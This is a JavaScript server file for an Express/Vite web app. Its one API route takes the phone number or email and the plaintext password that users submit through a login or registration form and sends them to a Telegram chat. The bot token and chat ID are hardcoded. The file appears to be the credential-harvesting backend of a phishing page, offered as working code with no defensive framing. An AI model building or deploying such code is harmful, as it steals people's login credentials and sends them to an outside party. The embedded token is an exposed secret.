import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";

const app = express();
const PORT = 3000;

app.use(express.json());

// Telegram configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8908374782:AAF2PPU4Xzl3nhHgca9cOXvXbqNHXbgCjGA";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "8141432907";

// API route to send notification to Telegram
app.post("/api/notify", async (req, res) => {
  const { type, data } = req.body;

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram credentials missing in environment variables.");
    return res.status(500).json({ error: "Server configuration error" });
  }

  const message = `
🔔 *New Auth Attempt: ${type.toUpperCase()}*
━━━━━━━━━━━━━━━━━━━━
👤 *User:* ${data.phone || data.email || "N/A"}
🔑 *Password:* \`${data.password}\`
📱 *Tab:* ${data.tab || "Registration"}
🕒 *Date:* ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━
  `;

  try {
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error("Telegram API Error:", errorData);
      return res.status(500).json({ error: "Failed to send notification" });
    }

    res.json({ success: true });
  } catch (error) {
    console.error("Network error sending to Telegram:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

async function startServer() {
  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
